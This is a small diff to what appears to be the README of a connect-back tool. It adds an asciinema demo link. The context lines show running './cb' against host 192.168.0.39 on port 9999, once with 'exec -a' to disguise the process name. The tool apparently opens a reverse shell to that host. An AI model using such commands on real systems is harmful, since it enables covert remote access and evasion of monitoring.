@@ -53,3 +53,4 @@ $ bash -c "CHOST=192.168.0.39 CPORT=9999 exec -a myrenamed_process ./cb "
 $ ./cb 192.168.0.39 9999
 ```
 
+[![asciicast](https://asciinema.org/a/dvkXoXeG5uVmhnQMvRQhaE9DG.svg)](https://asciinema.org/a/dvkXoXeG5uVmhnQMvRQhaE9DG)
